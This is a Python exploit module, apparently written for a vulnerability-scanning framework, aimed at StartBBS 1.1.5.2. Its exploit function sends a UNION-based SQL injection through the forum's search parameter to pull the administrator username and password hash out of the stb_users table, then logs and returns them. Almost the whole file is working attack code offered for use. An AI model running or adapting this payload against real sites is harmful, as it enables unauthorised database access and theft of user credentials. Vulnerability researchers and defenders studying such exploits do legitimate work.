#!/usr/bin/env python
# -*- coding:utf-8 -*-

from lib import logger
from lib import requests

author = "Chu <root@sh3ll.me>"
scope = "StartBBS 1.1.5.2"
description = "/themes/default/search.php 参数 q 未过滤导致 SQL 注入"
reference = "http://www.wooyun.org/bugs/wooyun-2010-067853"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]


def exploit(URL):
    url = URL + "/index.php/home/search?q=1'union select 1,2,3,4,concat" \
                "(0x6368756973686572657e7e7e,username,0x7e,password,0x7" \
                "e7e7e),6,7,8,9,0,1,2,3,4,5,6,7 from stb_users limit 1-" \
                "- &sitesearch=http://127.0.0.1/startbbs/"
    logger.process("Requesting target site")
    r = requests.get(url, timeout=5)
    r.close()
    if "chuishere" in r.text:
        logger.success("Exploitable!")
        username, md5 = r.text.split("~~~")[1].split("~")
        logger.success("Username: %s" % username)
        logger.success("Hash: %s" % md5)
        return "%s: %s|%s" % (URL, username, md5)
